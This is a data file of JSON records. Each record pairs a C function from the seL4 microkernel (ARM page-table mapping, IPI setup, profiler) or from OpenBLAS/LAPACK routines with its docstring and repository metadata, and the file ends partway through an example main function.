{"docstring": "/*\n * Reset all counters\n */\n", "func_signal": "void profiler_reset(void)", "code": "{\n    for (word_t i = 0; i < MAX_UNIQUE_INSTRUCTIONS; i++) {\n        profiler_entries[i].pc = 0;\n        profiler_entries[i].count = 0;\n    }\n    profiler_num_entries = 0;\n    profiler_dropped_instructions = 0;\n}", "path": "seL4/src/machine/profiler.c", "commit_date": "2020-03-09 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* the remote call being requested */\n", "func_signal": "static inline void init_ipi_args(IpiRemoteCall_t func,\n                                 word_t data1, word_t data2, word_t data3,\n                                 word_t mask)", "code": "{\n    remoteCall = (IpiModeRemoteCall_t)func;\n    ipi_args[0] = data1;\n    ipi_args[1] = data2;\n    ipi_args[2] = data3;\n\n    /* get number of cores involved in this IPI */\n    totalCoreBarrier = popcountl(mask);\n}", "path": "seL4/src/arch/arm/smp/ipi.c", "commit_date": "2020-03-09 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* ==================== BOOT CODE FINISHES HERE ==================== */\n", "func_signal": "findPDForASID_ret_t findPDForASID(asid_t asid)", "code": "{\n    findPDForASID_ret_t ret;\n    asid_pool_t *poolPtr;\n    pde_t *pd;\n\n    poolPtr = armKSASIDTable[asid >> asidLowBits];\n    if (unlikely(!poolPtr)) {\n        current_lookup_fault = lookup_fault_invalid_root_new();\n\n        ret.pd = NULL;\n        ret.status = EXCEPTION_LOOKUP_FAULT;\n        return ret;\n    }\n\n    pd = poolPtr->array[asid & MASK(asidLowBits)];\n    if (unlikely(!pd)) {\n        current_lookup_fault = lookup_fault_invalid_root_new();\n\n        ret.pd = NULL;\n        ret.status = EXCEPTION_LOOKUP_FAULT;\n        return ret;\n    }\n\n    ret.pd = pd;\n    ret.status = EXCEPTION_NONE;\n    return ret;\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* for x86, the IRQIssueIRQHandler is only allowed to\n * issue a hander for IRQ 0-15, the isa IRQs.\n * Use getIRQHandlerIOAPIC and getIRQHandlerMSI for\n * the IRQs >= 16. Additionally these IRQs only exist\n * if using the legacy PIC interrupt\n */\n", "func_signal": "exception_t Arch_checkIRQ(word_t irq_w)", "code": "{\n    if (config_set(CONFIG_IRQ_PIC) && irq_w >= irq_isa_min && irq_w <= irq_isa_max) {\n        return EXCEPTION_NONE;\n    }\n    if (config_set(CONFIG_IRQ_IOAPIC)) {\n        userError(\"IRQControl: Illegal operation\");\n        current_syscall_error.type = seL4_IllegalOperation;\n    } else {\n        userError(\"IRQControl: IRQ %ld should be in range %ld - %ld\", irq_w, (long)irq_isa_min, (long)irq_isa_max);\n        current_syscall_error.type = seL4_RangeError;\n        current_syscall_error.rangeErrorMin = irq_isa_min;\n        current_syscall_error.rangeErrorMax = irq_isa_max;\n    }\n    return EXCEPTION_SYSCALL_ERROR;\n}", "path": "seL4/src/arch/x86/object/interrupt.c", "commit_date": "2020-03-09 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* CONFIG_ARM_HYPERVISOR_SUPPORT */\n", "func_signal": "BOOT_CODE void write_it_asid_pool(cap_t it_ap_cap, cap_t it_pd_cap)", "code": "{\n    asid_pool_t *ap = ASID_POOL_PTR(pptr_of_cap(it_ap_cap));\n    ap->array[IT_ASID] = PDE_PTR(pptr_of_cap(it_pd_cap));\n    armKSASIDTable[IT_ASID >> asidLowBits] = ap;\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/*\n * Record a sample\n */\n", "func_signal": "void profiler_record_sample(word_t pc)", "code": "{\n    /* Number used for hashing such that the gcd of MAX_UNIQUE_INSTRUCTIONS and\n     * (1 .. hashVal) is 1.\n     *\n     * As MAX_UNIQUE_INSTRUCTIONS is prime, this can be ensured mearly by\n     * having hashVal < MAX_UNIQUE_INSTRUCTIONS. */\n    const int hashVal = 1024;\n\n    /* Hash optimised for valid ARM instruction addresses, which are always\n     * word aligned. */\n    word_t hash = (pc >> 2) % MAX_UNIQUE_INSTRUCTIONS;\n    word_t hash2 = ((pc >> 2) % hashVal) + 1;\n\n    if (!profiler_enabled) {\n        return;\n    }\n\n    while (true) {\n\n        if (profiler_entries[hash].pc == pc) {\n\n            /* Found the correct entry */\n            profiler_entries[hash].count++;\n            break;\n\n        } else if (profiler_entries[hash].pc == 0) {\n\n            /* Found a spot for a new entry */\n            if (profiler_num_entries < (MAX_UNIQUE_INSTRUCTIONS / 4) * 3) {\n                profiler_entries[hash].pc = pc;\n                profiler_entries[hash].count = 1;\n                profiler_num_entries++;\n                break;\n            } else {\n                /* Too many entries. Abort the record. */\n                profiler_dropped_instructions++;\n                break;\n            }\n        }\n\n        /* Keep searching */\n        hash += hash2;\n        hash %= MAX_UNIQUE_INSTRUCTIONS;\n    }\n}", "path": "seL4/src/machine/profiler.c", "commit_date": "2020-03-09 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* CONFIG_ARM_HYPERVISOR_SUPPORT */\n", "func_signal": "BOOT_CODE void map_kernel_window(void)", "code": "{\n    paddr_t    phys;\n    uint32_t   idx;\n    pdeS1_t pde;\n    pte_t UNUSED pteS2;\n\n    /* Initialise PGD */\n    for (idx = 0; idx < 3; idx++) {\n        pde = pdeS1_pdeS1_invalid_new();\n        armHSGlobalPGD[idx] = pde;\n    }\n    pde = pdeS1_pdeS1_coarse_new(0, 0, 0, 0, addrFromPPtr(armHSGlobalPD));\n    armHSGlobalPGD[3] = pde;\n\n    /* Initialise PMD */\n    /* Invalidate up until USER_TOP */\n    for (idx = 0; idx < (USER_TOP - 0xC0000000) >> (PT_INDEX_BITS + PAGE_BITS); idx++) {\n        pde = pdeS1_pdeS1_invalid_new();\n        armHSGlobalPD[idx] = pde;\n    }\n    /* mapping of PPTR_BASE (virtual address) to kernel's physBase  */\n    /* up to end of virtual address space minus 2M using 2M frames */\n    phys = physBase;\n    for (; idx < BIT(PT_INDEX_BITS) - 1; idx++) {\n        pde = pdeS1_pdeS1_section_new(\n                  0, /* Executable */\n                  0, /* Executable in PL1 */\n                  0, /* Not contiguous */\n                  phys, /* Address */\n                  0, /* global */\n                  1, /* AF -- always set to 1 */\n                  0, /* Not Shareable */\n                  0, /* AP: WR at PL1 only */\n                  0, /* Not secure */\n                  1  /* outer write-back Cacheable */\n              );\n        armHSGlobalPD[idx] = pde;\n        phys += BIT(PT_INDEX_BITS + PAGE_BITS);\n    }\n    /* map page table covering last 2M of virtual address space */\n    pde = pdeS1_pdeS1_coarse_new(0, 0, 0, 0, addrFromPPtr(armHSGlobalPT));\n    armHSGlobalPD[idx] = pde;\n\n    /* now start initialising the page table */\n    memzero(armHSGlobalPT, 1 << seL4_PageTableBits);\n    for (idx = 0; idx < 256; idx++) {\n        pteS1_t pte;\n        pte = pteS1_pteS1_small_new(\n                  0, /* Executable */\n                  0, /* Executable in PL1 */\n                  0, /* Not contiguous */\n                  phys, /* Address */\n                  0, /* global */\n                  1, /* AF -- always set to 1 */\n                  0, /* Not Shareable */\n                  0, /* AP: WR at PL1 only */\n                  0, /* Not secure */\n                  1  /* outer write-back Cacheable */\n              );\n        armHSGlobalPT[idx] = pte;\n        phys += BIT(PAGE_BITS);\n    }\n    /* map vector table */\n    map_kernel_frame(\n        addrFromPPtr(arm_vector_table),\n        PPTR_VECTOR_TABLE,\n        VMKernelOnly,\n        vm_attributes_new(\n            false, /* armExecuteNever */\n            true,  /* armParityEnabled */\n            true   /* armPageCacheable */\n        )\n    );\n\n#ifdef CONFIG_KERNEL_GLOBALS_FRAME\n    /* map globals frame */\n    map_kernel_frame(\n        addrFromPPtr(armKSGlobalsFrame),\n        seL4_GlobalsFrame,\n        VMReadOnly,\n        vm_attributes_new(\n            false, /* armExecuteNever */\n            true,  /* armParityEnabled */\n            true   /* armPageCacheable */\n        )\n    );\n    /* map globals into user global PT */\n    pteS2 = pte_pte_small_new(\n                1, /* Not Executeable */\n                0, /* Not contiguous */\n                addrFromPPtr(armKSGlobalsFrame),\n                1, /* AF -- always set */\n                0, /* Not shared */\n                HAPFromVMRights(VMReadOnly),\n                MEMATTR_CACHEABLE  /* Cacheable */\n            );\n    memzero(armUSGlobalPT, 1 << seL4_PageTableBits);\n    idx = (seL4_GlobalsFrame >> PAGE_BITS) & (MASK(PT_INDEX_BITS));\n    armUSGlobalPT[idx] = pteS2;\n#endif /* CONFIG_KERNEL_GLOBALS_FRAME */\n\n    map_kernel_devices();\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* use when only have access to vptr of frames */\n", "func_signal": "static void _cap_frame_print_attrs_vptr(word_t vptr, vspace_root_t *vspace)", "code": "{\n    lookupPUDSlot_ret_t pudSlot = lookupPUDSlot(vspace, vptr);\n    if (pudSlot.status != EXCEPTION_NONE) {\n        return;\n    }\n\n    switch (pude_ptr_get_pude_type(pudSlot.pudSlot)) {\n    case pude_pude_1g:\n        printf(\"frame_%p_%04lu \", pudSlot.pudSlot, GET_PUD_INDEX(vptr));\n        cap_frame_print_attrs_pud(pudSlot.pudSlot);\n        break;\n\n    case pude_pude_pd: {\n        pde_t *pd = paddr_to_pptr(pude_pude_pd_ptr_get_pd_base_address(pudSlot.pudSlot));\n        pde_t *pdSlot = pd + GET_PD_INDEX(vptr);\n\n        switch (pde_ptr_get_pde_type(pdSlot)) {\n        case pde_pde_large:\n            printf(\"frame_%p_%04lu \", pdSlot, GET_PD_INDEX(vptr));\n            cap_frame_print_attrs_pd(pdSlot);\n            break;\n\n        case pde_pde_small: {\n            pte_t *pt = paddr_to_pptr(pde_pde_small_ptr_get_pt_base_address(pdSlot));\n            pte_t *ptSlot = pt + GET_PT_INDEX(vptr);\n\n            if (pte_ptr_get_present(ptSlot)) {\n                printf(\"frame_%p_%04lu \", ptSlot, GET_PT_INDEX(vptr));\n                cap_frame_print_attrs_pt(ptSlot);\n                break;\n            } else {\n                return;\n            }\n        }\n        default:\n            assert(0);\n        }\n        break;\n    }\n    default:\n        assert(0);\n    }\n}", "path": "seL4/src/arch/arm/64/machine/capdl.c", "commit_date": "2020-10-28 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* AP encoding slightly different. AP only used for kernel mappings which are fixed after boot time */\n", "func_signal": "BOOT_CODE\nstatic word_t CONST APFromVMRights(vm_rights_t vm_rights)", "code": "{\n    switch (vm_rights) {\n    case VMKernelOnly:\n        return 0;\n    case VMReadWrite:\n        return 1;\n    case VMNoAccess:\n        /* RO at PL1 only */\n        return 2;\n    case VMReadOnly:\n        return 3;\n    default:\n        fail(\"Invalid VM rights\");\n    }\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* Create an address space for the initial thread.\n * This includes page directory and page tables */\n", "func_signal": "BOOT_CODE cap_t create_it_address_space(cap_t root_cnode_cap, v_region_t it_v_reg)", "code": "{\n    vptr_t     pt_vptr;\n    seL4_SlotPos slot_pos_before;\n    seL4_SlotPos slot_pos_after;\n\n    /* create PD cap */\n    copyGlobalMappings(PDE_PTR(rootserver.vspace));\n    cleanCacheRange_PoU(rootserver.vspace, rootserver.vspace + (1 << seL4_PageDirBits) - 1,\n                        addrFromPPtr((void *)rootserver.vspace));\n    cap_t pd_cap =\n        cap_page_directory_cap_new(\n            true,    /* capPDIsMapped   */\n            IT_ASID, /* capPDMappedASID */\n            rootserver.vspace  /* capPDBasePtr    */\n        );\n    slot_pos_before = ndks_boot.slot_pos_cur;\n    write_slot(SLOT_PTR(pptr_of_cap(root_cnode_cap), seL4_CapInitThreadVSpace), pd_cap);\n\n    /* create all PT caps necessary to cover userland image */\n    for (pt_vptr = ROUND_DOWN(it_v_reg.start, PT_INDEX_BITS + PAGE_BITS);\n         pt_vptr < it_v_reg.end;\n         pt_vptr += BIT(PT_INDEX_BITS + PAGE_BITS)) {\n        if (!provide_cap(root_cnode_cap,\n                         create_it_page_table_cap(pd_cap, it_alloc_paging(), pt_vptr, IT_ASID))\n           ) {\n            return cap_null_cap_new();\n        }\n    }\n\n    slot_pos_after = ndks_boot.slot_pos_cur;\n    ndks_boot.bi_frame->userImagePaging = (seL4_SlotRegion) {\n        slot_pos_before, slot_pos_after\n    };\n\n    return pd_cap;\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* ==================== BOOT CODE STARTS HERE ==================== */\n", "func_signal": "BOOT_CODE void map_kernel_frame(paddr_t paddr, pptr_t vaddr, vm_rights_t vm_rights, vm_attributes_t attributes)", "code": "{\n    word_t idx = (vaddr & MASK(pageBitsForSize(ARMSection))) >> pageBitsForSize(ARMSmallPage);\n\n    assert(vaddr >= PPTR_TOP); /* vaddr lies in the region the global PT covers */\n#ifndef CONFIG_ARM_HYPERVISOR_SUPPORT\n    word_t tex;\n    if (vm_attributes_get_armPageCacheable(attributes)) {\n        tex = 5; /* TEX = 0b1(Cached)01(Outer Write Allocate) */\n    } else {\n        tex = 0;\n    }\n    armKSGlobalPT[idx] =\n        pte_pte_small_new(\n            paddr,\n            0, /* global */\n            SMP_TERNARY(1, 0), /* shareable if SMP enabled, otherwise unshared */\n            0, /* APX = 0, privileged full access */\n            tex,\n            APFromVMRights(vm_rights),\n            0, /* C (Inner write allocate) */\n            1, /* B (Inner write allocate) */\n            0  /* executable */\n        );\n#else /* CONFIG_ARM_HYPERVISOR_SUPPORT */\n    armHSGlobalPT[idx] =\n        pteS1_pteS1_small_new(\n            0, /* Executeable */\n            0, /* Executeable at PL1 */\n            0, /* Not contiguous */\n            paddr,\n            0, /* global */\n            1, /* AF -- always set */\n            0, /* Not shared */\n            APFromVMRights(vm_rights),\n            0, /* non secure */\n            vm_attributes_get_armPageCacheable(attributes)\n        );\n#endif /* !CONFIG_ARM_HYPERVISOR_SUPPORT */\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* Stage-1 access permissions:\n * AP[2:1]  higer EL        EL0\n *   00       rw            None\n *   01       rw            rw\n *   10       r             None\n *   11       r             r\n *\n * Stage-2 access permissions:\n * S2AP    Access from Nonsecure EL1 or Non-secure EL0\n *  00                      None\n *  01                      r\n *  10                      w\n *  11                      rw\n *\n *  For VMs or native seL4 applications, if hypervisor support\n *  is enabled, we use the S2AP. The kernel itself running in\n *  EL2 still uses the Stage-1 AP format.\n */\n/* use when only have access to pte of frames */\n", "func_signal": "static void cap_frame_print_attrs_pud(pude_t *pudSlot)", "code": "{\n    cap_frame_print_attrs_impl(pude_pude_1g_ptr_get_SH(pudSlot),\n                               pude_pude_1g_ptr_get_AP(pudSlot),\n                               pude_pude_1g_ptr_get_UXN(pudSlot));\n}", "path": "seL4/src/arch/arm/64/machine/capdl.c", "commit_date": "2020-10-28 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* CONFIG_ARM_HYPERVISOR_SUPPORT */\n", "func_signal": "void kernelPrefetchAbort(word_t pc)", "code": "{\n    word_t UNUSED ifsr = getIFSR();\n\n    printf(\"\\n\\nKERNEL PREFETCH ABORT!\\n\");\n    printf(\"Faulting instruction: 0x%x\\n\", (unsigned int)pc);\n    printf(\"IFSR: 0x%x\\n\", (unsigned int)ifsr);\n\n    halt();\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* ENABLE_SMP_SUPPORT */\n", "func_signal": "static void invvpid_context(uint16_t vpid)", "code": "{\n    struct {\n        uint64_t vpid : 16;\n        uint64_t rsvd : 48;\n        uint64_t address;\n    } PACKED operand = {vpid, 0, 0};\n    asm volatile(\"invvpid %0, %1\" :: \"m\"(operand), \"r\"((word_t)1) : \"cc\");\n}", "path": "seL4/src/arch/x86/object/vcpu.c", "commit_date": "2020-06-22 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* Create a frame cap for the initial thread. */\n", "func_signal": "static BOOT_CODE cap_t create_it_frame_cap(pptr_t pptr, vptr_t vptr, asid_t asid, bool_t use_large)", "code": "{\n    if (use_large)\n        return\n            cap_frame_cap_new(\n                ARMSection,                    /* capFSize           */\n                ASID_LOW(asid),                /* capFMappedASIDLow  */\n                wordFromVMRights(VMReadWrite), /* capFVMRights       */\n                vptr,                          /* capFMappedAddress  */\n                false,                         /* capFIsDevice       */\n                ASID_HIGH(asid),               /* capFMappedASIDHigh */\n                pptr                           /* capFBasePtr        */\n            );\n    else\n        return\n            cap_small_frame_cap_new(\n                ASID_LOW(asid),                /* capFMappedASIDLow  */\n                wordFromVMRights(VMReadWrite), /* capFVMRights       */\n                vptr,                          /* capFMappedAddress  */\n                false,                         /* capFIsDevice       */\n#ifdef CONFIG_TK1_SMMU\n                0,                             /* IOSpace            */\n#endif\n                ASID_HIGH(asid),               /* capFMappedASIDHigh */\n                pptr                           /* capFBasePtr        */\n            );\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* !CONFIG_ARM_HYPERVISOR_SUPPORT */\n", "func_signal": "static BOOT_CODE void map_it_frame_cap(cap_t pd_cap, cap_t frame_cap, bool_t executable)", "code": "{\n    pte_t *pt;\n    pte_t *targetSlot;\n    pde_t *pd    = PDE_PTR(cap_page_directory_cap_get_capPDBasePtr(pd_cap));\n    void  *frame = (void *)generic_frame_cap_get_capFBasePtr(frame_cap);\n    vptr_t vptr  = generic_frame_cap_get_capFMappedAddress(frame_cap);\n\n    assert(generic_frame_cap_get_capFMappedASID(frame_cap) != 0);\n\n    pd += (vptr >> pageBitsForSize(ARMSection));\n    pt = ptrFromPAddr(pde_pde_coarse_ptr_get_address(pd));\n    targetSlot = pt + ((vptr & MASK(pageBitsForSize(ARMSection)))\n                       >> pageBitsForSize(ARMSmallPage));\n#ifndef CONFIG_ARM_HYPERVISOR_SUPPORT\n    *targetSlot = pte_pte_small_new(\n                      addrFromPPtr(frame),\n                      1, /* not global */\n                      SMP_TERNARY(1, 0), /* shareable if SMP enabled, otherwise unshared */\n                      0, /* APX = 0, privileged full access */\n                      5, /* TEX = 0b1(Cached)01(Outer Write Allocate) */\n                      APFromVMRights(VMReadWrite),\n                      0, /* C (Inner write allocate) */\n                      1, /* B (Inner write allocate) */\n                      !executable\n                  );\n#else\n    *targetSlot = pte_pte_small_new(\n                      0, /* Executeable */\n                      0, /* Not contiguous */\n                      addrFromPPtr(frame),\n                      1, /* AF -- always set */\n                      0, /* Not shared */\n                      HAPFromVMRights(VMReadWrite),\n                      MEMATTR_CACHEABLE  /* Cacheable */\n                  );\n#endif\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* ================= INVOCATION HANDLING STARTS HERE ================== */\n", "func_signal": "static exception_t performPDFlush(int invLabel, pde_t *pd, asid_t asid, vptr_t start,\n                                  vptr_t end, paddr_t pstart)", "code": "{\n    bool_t root_switched;\n\n    /* Flush if given a non zero range */\n    if (start < end) {\n        root_switched = setVMRootForFlush(pd, asid);\n\n        doFlush(invLabel, start, end, pstart);\n\n        if (root_switched) {\n            setVMRoot(NODE_STATE(ksCurThread));\n        }\n    }\n\n    return EXCEPTION_NONE;\n}", "path": "seL4/src/arch/arm/32/kernel/vspace.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "seL4/seL4", "stars": 4474, "license": "other", "language": "c", "size": 14018}
{"docstring": "/* Check a vector for NaN entries. */\n", "func_signal": "lapack_logical LAPACKE_d_nancheck( lapack_int n,\n                                    const double *x,\n                                    lapack_int incx )", "code": "{\n    lapack_int i, inc;\n\n    if( incx == 0 ) return (lapack_logical) LAPACK_DISNAN( x[0] );\n    inc = ( incx > 0 ) ? incx : -incx ;\n\n    for( i = 0; i < n*inc; i+=inc ) {\n        if( LAPACK_DISNAN( x[i] ) )\n            return (lapack_logical) 1;\n    }\n    return (lapack_logical) 0;\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/utils/lapacke_d_nancheck.c", "commit_date": "2015-11-20 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** zpotrf's recursive compute kernel */\n", "func_signal": "static void RELAPACK_zpotrf_rec(\n    const char *uplo, const blasint *n,\n    double *A, const blasint *ldA,\n    blasint *info\n)", "code": "{\n\n    if (*n <= MAX(CROSSOVER_ZPOTRF, 1)) {\n        // Unblocked\n        LAPACK(zpotf2)(uplo, n, A, ldA, info);\n        return;\n    }\n\n    // Constants\n    const double ONE[]  = { 1., 0. };\n    const double MONE[] = { -1., 0. };\n\n    // Splitting\n    const blasint n1 = ZREC_SPLIT(*n);\n    const blasint n2 = *n - n1;\n\n    // A_TL A_TR\n    // A_BL A_BR\n    double *const A_TL = A;\n    double *const A_TR = A + 2 * *ldA * n1;\n    double *const A_BL = A                 + 2 * n1;\n    double *const A_BR = A + 2 * *ldA * n1 + 2 * n1;\n\n    // recursion(A_TL)\n    RELAPACK_zpotrf_rec(uplo, &n1, A_TL, ldA, info);\n    if (*info)\n        return;\n\n    if (*uplo == 'L') {\n        // A_BL = A_BL / A_TL'\n        BLAS(ztrsm)(\"R\", \"L\", \"C\", \"N\", &n2, &n1, ONE, A_TL, ldA, A_BL, ldA);\n        // A_BR = A_BR - A_BL * A_BL'\n        BLAS(zherk)(\"L\", \"N\", &n2, &n1, MONE, A_BL, ldA, ONE, A_BR, ldA);\n    } else {\n        // A_TR = A_TL' \\ A_TR\n        BLAS(ztrsm)(\"L\", \"U\", \"C\", \"N\", &n1, &n2, ONE, A_TL, ldA, A_TR, ldA);\n        // A_BR = A_BR - A_TR' * A_TR\n        BLAS(zherk)(\"U\", \"C\", &n2, &n1, MONE, A_TR, ldA, ONE, A_BR, ldA);\n    }\n\n    // recursion(A_BR)\n    RELAPACK_zpotrf_rec(uplo, &n2, A_BR, ldA, info);\n    if (*info)\n        *info += n1;\n}", "path": "OpenBLAS/relapack/src/zpotrf.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Auxiliary routine: printing a vector of integers */\n", "func_signal": "void print_int_vector( char* desc, lapack_int n, lapack_int* a )", "code": "{\n        lapack_int j;\n        printf( \"\\n %s\\n\", desc );\n        for( j = 0; j < n; j++ ) printf( \" %6i\", a[j] );\n        printf( \"\\n\" );\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/example/example_user.c", "commit_date": "2017-01-06 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** SGBTRF computes an LU factorization of a real m-by-n band matrix A using partial pivoting with row interchanges.\n *\n * This routine is functionally equivalent to LAPACK's sgbtrf.\n * For details on its interface, see\n * http://www.netlib.org/lapack/explore-html/d5/d72/sgbtrf_8f.html\n * */\n", "func_signal": "void RELAPACK_sgbtrf(\n    const blasint *m, const blasint *n, const blasint *kl, const blasint *ku,\n    float *Ab, const blasint *ldAb, blasint *ipiv,\n    blasint *info\n)", "code": "{\n    // Check arguments\n    *info = 0;\n    if (*m < 0)\n        *info = -1;\n    else if (*n < 0)\n        *info = -2;\n    else if (*kl < 0)\n        *info = -3;\n    else if (*ku < 0)\n        *info = -4;\n    else if (*ldAb < 2 * *kl + *ku + 1) \n        *info = -6;\n    if (*info) {\n        const blasint minfo = -*info;\n        LAPACK(xerbla)(\"SGBTRF\", &minfo, strlen(\"SGBTRF\"));\n        return;\n    }\n\n    if (*m == 0 || *n == 0) return;\n\n    if (*ldAb == 1) {\n        LAPACK(sgbtf2)(m, n, kl, ku, Ab, ldAb, ipiv, info);\n\treturn;\n    }\n\n    // Constant\n    const float ZERO[] = { 0. };\n\n    // Result upper band width\n    const blasint kv = *ku + *kl;\n\n    // Unskewg A\n    const blasint ldA[] = { *ldAb - 1 };\n    float *const A = Ab + kv;\n\n    // Zero upper diagonal fill-in elements\n    blasint i, j;\n    for (j = 0; j < *n; j++) {\n        float *const A_j = A + *ldA * j;\n        for (i = MAX(0, j - kv); i < j - *ku; i++)\n            A_j[i] = 0.;\n    }\n\n    // Allocate work space\n    const blasint n1 = SREC_SPLIT(*n);\n    const blasint mWorkl = abs( (kv > n1) ? MAX(1, *m - *kl) : kv );\n    const blasint nWorkl = abs( (kv > n1) ? n1 : kv );\n    const blasint mWorku = abs( (*kl > n1) ? n1 : *kl );\n    const blasint nWorku = abs( (*kl > n1) ? MAX(0, *n - *kl) : *kl );\n    float *Workl = malloc(mWorkl * nWorkl * sizeof(float));\n    float *Worku = malloc(mWorku * nWorku * sizeof(float));\n    LAPACK(slaset)(\"L\", &mWorkl, &nWorkl, ZERO, ZERO, Workl, &mWorkl);\n    LAPACK(slaset)(\"U\", &mWorku, &nWorku, ZERO, ZERO, Worku, &mWorku);\n\n\n    // Recursive kernel\n    RELAPACK_sgbtrf_rec(m, n, kl, ku, Ab, ldAb, ipiv, Workl, &mWorkl, Worku, &mWorku, info);\n\n    // Free work space\n    free(Workl);\n    free(Worku);\n}", "path": "OpenBLAS/relapack/src/sgbtrf.c", "commit_date": "2020-08-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Dummy Function */\n", "func_signal": "int  goto_get_num_procs  (void)", "code": "{ return 1;};\nvoid goto_set_num_threads(int num_threads) {};\n\n#else\n\n#if defined(OS_LINUX) || defined(OS_SUNOS)\n#ifndef NO_AFFINITY\nint get_num_procs(void);\n#else\nint get_num_procs(void) {\n\n  static int nums = 0;\n  cpu_set_t cpuset,*cpusetp;\n  size_t size;\n  int ret;\n\n#if defined(__GLIBC_PREREQ)\n#if !__GLIBC_PREREQ(2, 7)\n  int i;\n#if !__GLIBC_PREREQ(2, 6)\n  int n;\n#endif\n#endif\n#endif\n\n  if (!nums) nums = sysconf(_SC_NPROCESSORS_CONF);\n#if !defined(OS_LINUX)\n  return nums;\n#endif\n\n/*\n#if !defined(__GLIBC_PREREQ)\n  return nums;\n#else\n #if !__GLIBC_PREREQ(2, 3)\n  return nums;\n #endif\n\n #if !__GLIBC_PREREQ(2, 7)\n  ret = sched_getaffinity(0,sizeof(cpuset), &cpuset);\n  if (ret!=0) return nums;\n  n=0;\n  #if !__GLIBC_PREREQ(2, 6)\n  for (i=0;i<nums;i++)\n     if (CPU_ISSET(i,&cpuset)) n++;\n  nums=n;\n  #else\n  nums = CPU_COUNT(sizeof(cpuset),&cpuset);\n  #endif\n  return nums;\n #else\n  if (nums >= CPU_SETSIZE) {\n    cpusetp = CPU_ALLOC(nums);\n      if (cpusetp == NULL) {\n        return nums;\n      }\n    size = CPU_ALLOC_SIZE(nums);\n    ret = sched_getaffinity(0,size,cpusetp);\n    if (ret!=0) {\n      CPU_FREE(cpusetp);\n      return nums;\n    }\n    ret = CPU_COUNT_S(size,cpusetp);\n    if (ret > 0 && ret < nums) nums = ret;\t\n    CPU_FREE(cpusetp);\n    return nums;\n  } else {\n    ret = sched_getaffinity(0,sizeof(cpuset),&cpuset);\n    if (ret!=0) {\n      return nums;\n    }\n    ret = CPU_COUNT(&cpuset);\n    if (ret > 0 && ret < nums) nums = ret;\t\n    return nums;\n  }\n #endif\n#endif\n*/\n   return 1;\n}", "path": "OpenBLAS/driver/others/memory_qalloc.c", "commit_date": "2019-11-17 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Main program */\n", "func_signal": "int main()", "code": "{\n        /* Locals */\n        lapack_int n = N, nrhs = NRHS, lda = LDA, ldb = LDB, info;\n        /* Local arrays */\n        lapack_int ipiv[N];\n        double a[LDA*N] = {\n            6.80, -6.05, -0.45,  8.32, -9.67,\n           -2.11, -3.30,  2.58,  2.71, -5.14,\n            5.66, 5.36, -2.70,  4.35, -7.26,\n            5.97, -4.44,  0.27, -7.17, 6.08,\n            8.23, 1.08,  9.04,  2.14, -6.87\n        };\n        double b[LDB*N] = {\n            4.02, -1.56, 9.81,\n            6.19,  4.00, -4.09,\n           -8.22, -8.67, -4.57,\n           -7.57,  1.75, -8.61,\n           -3.03,  2.86, 8.99\n        };\n\n       double aNorm;\n       double rcond;\n       char ONE_NORM = '1';\n       lapack_int NROWS = n;\n       lapack_int NCOLS = n;\n       lapack_int LEADING_DIMENSION_A = n;\n\n              /* Print Entry Matrix */\n        print_matrix( \"Entry Matrix 